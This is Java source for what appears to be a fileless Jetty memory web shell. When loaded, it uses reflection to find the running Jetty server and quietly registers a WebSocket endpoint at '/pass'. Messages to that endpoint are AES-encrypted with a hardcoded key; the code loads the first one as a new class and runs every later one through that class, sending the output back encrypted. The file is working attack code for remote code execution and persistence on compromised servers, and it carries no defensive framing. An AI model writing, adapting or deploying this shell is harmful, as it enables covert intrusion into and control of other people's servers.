import javax.servlet.ServletContext;
import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpointConfig;
import javax.websocket.server.ServerContainer;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;

//jetty9-10.11 test
public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.Whole<ByteBuffer>{
    private static boolean initialized = false;
    private static final Object lock = new Object();
    Class payload = null;
    Session session = null;
    String xc = "3c6e0b8a9c15224a";
    String pass = "pass";


    static {
        new AesJettyWebsocketShell();
    }

    public AesJettyWebsocketShell(){
        synchronized (lock){
            if (!initialized){
                initialized = true;
                try {
                    addEndpoint(this);
                }catch (Throwable ignored){

                }
            }
        }
    }

    public AesJettyWebsocketShell(Session session){
        this.session = session;
    }

    public static Object[] getServers() throws Throwable {
        HashSet contexts = new HashSet();
        HashSet<String> blackType = new HashSet<String>();
        blackType.add(int.class.getName());
        blackType.add(short.class.getName());
        blackType.add(long.class.getName());
        blackType.add(double.class.getName());
        blackType.add(byte.class.getName());
        blackType.add(float.class.getName());
        blackType.add(char.class.getName());
        blackType.add(boolean.class.getName());
        blackType.add(Integer.class.getName());
        blackType.add(Short.class.getName());
        blackType.add(Long.class.getName());
        blackType.add(Double.class.getName());
        blackType.add(Byte.class.getName());
        blackType.add(Float.class.getName());
        blackType.add(Character.class.getName());
        blackType.add(Boolean.class.getName());
        blackType.add(String.class.getName());
        Object jettyServer = searchObject("org.eclipse.jetty.server.Server",Thread.currentThread(),new HashSet(),blackType,50,0);
        if (jettyServer != null) {
            try {
                Object serverHandle = getFieldValue(jettyServer,"_handler");
                Object handles = serverHandle.getClass().getMethod("getChildHandlers").invoke(serverHandle);
                if (handles.getClass().isArray()) {
                    int handleSize = Array.getLength(handles);
                    for (int i = 0; i < handleSize; i++) {
                        Object handle = Array.get(handles,i);
                        if (handle!=null && "org.eclipse.jetty.webapp.WebAppContext".equals(handle.getClass().getName())){
                            contexts.add(handle);
                        }
                    }
                }
            }catch (Throwable e){

            }
        }
        return contexts.toArray();
    }
    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDetch,int currentDetch)throws Throwable {
        currentDetch++;

        if (currentDetch >= maxDetch){
            return null;
        }

        if (object != null){

            if (targetClassName.equals(object.getClass().getName())){
                return object;
            }

            Integer hash = System.identityHashCode(object);
            if (!blacklist.contains(hash)) {
                blacklist.add(new Integer(hash));
                Field[] fields = null;
                ArrayList<Field> fieldsArray = new ArrayList();
                Class objClass = object.getClass();
                while (objClass != null){
                    Field[] fields1 = objClass.getDeclaredFields();
                    fieldsArray.addAll(Arrays.asList(fields1));
                    objClass = objClass.getSuperclass();
                }
                fields = fieldsArray.toArray(new Field[0]);


                for (int i = 0; i < fields.length; i++) {
                    Field field = fields[i];

                    try {
                        field.setAccessible(true);
                        Class fieldType = field.getType();
                        if (!blackType.contains(fieldType.getName())){
                            Object fieldValue = field.get(object);
                            if (fieldValue != null){
                                Object ret = null;
                                if (fieldType.isArray()){
                                    if (!blackType.contains(fieldType.getComponentType().getName())){
                                        int arraySize = Array.getLength(fieldValue);
                                        for (int j = 0; j < arraySize; j++) {
                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDetch,currentDetch);
                                            if (ret!= null){
                                                break;
                                            }
                                        }
                                    }
                                }else{
                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDetch,currentDetch);
                                }
                                if (ret!= null){
                                    return ret;
                                }
                            }
                        }
                    }catch (Throwable e){

                    }
                }
            }
        }
        return null;

    }
    public static boolean canAdd(Object obj,String path) {
        try {
            java.lang.reflect.Method method = obj.getClass().getMethod("findMapping",new Class[]{String.class});
            if (method.invoke(obj,new Object[]{ path }) != null){
                return false;
            }
        }catch (Throwable t) {

        }
        return true;
    }
    private boolean addEndpoint(Endpoint endpoint) throws Throwable {
        Object[] servers = getServers();

        boolean isOk = false;

        try {
            for (int i = 0; i < servers.length; i++) {
                Object server = servers[i];
                try {
                    ServletContext servletContext = (ServletContext) server.getClass().getMethod("getServletContext").invoke(server);
                    int maxBinaryMessageBufferSize = 10485760;
                    String websocketPath = String.format("/%s",pass);
                    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(endpoint.getClass(),websocketPath).build();
                    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
                    try {
                        if (canAdd(container,websocketPath)){
                            if (container.getDefaultMaxBinaryMessageBufferSize() < maxBinaryMessageBufferSize){
                                container.setDefaultMaxBinaryMessageBufferSize(maxBinaryMessageBufferSize);
                            }
                            container.addEndpoint(configEndpoint);
                            isOk = true;
                        }
                    } catch (Throwable e) {

                    }
                }catch (Throwable e){

                }
            }
        }catch (Throwable e){

        }



        return isOk;
    }

    public static Field getField(Object obj, String fieldName){
        Class clazz = null;

        if(obj == null){
            return null;
        }

        if (obj instanceof Class){
            clazz = (Class)obj;
        }else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz!=null){
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }catch (Exception e){
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null){
            field.setAccessible(true);
        }

        return field;
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }
    public byte[] aes(byte[] s,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            return null;
        }
    }

    public void onOpen(Session session, EndpointConfig endpointConfig) {
        session.addMessageHandler(new AesJettyWebsocketShell(session));
    }

    private Class defClass(byte[] classBytes) throws Throwable {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0],AesJettyWebsocketShell.class.getClassLoader());
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        return (Class) defineClassMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    public void onMessage(ByteBuffer byteBuffer) {
        try {
            int limit = byteBuffer.limit();
            byte[] data = new byte[limit];
            byteBuffer.get(data,0,limit);
            data = aes(data,false);
            byte[] response = new byte[0];
            if (payload == null) {
                payload = defClass(data);
            }else {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                Object obj = payload.newInstance();
                obj.equals(data);
                obj.equals(bos);
                obj.toString();
                response = bos.toByteArray();
            }
            session.getBasicRemote().sendBinary(ByteBuffer.wrap(aes(response,true)));
        }catch (Throwable e){
            try {
                session.close();
            } catch (IOException ex) {

            }
        }
    }
}
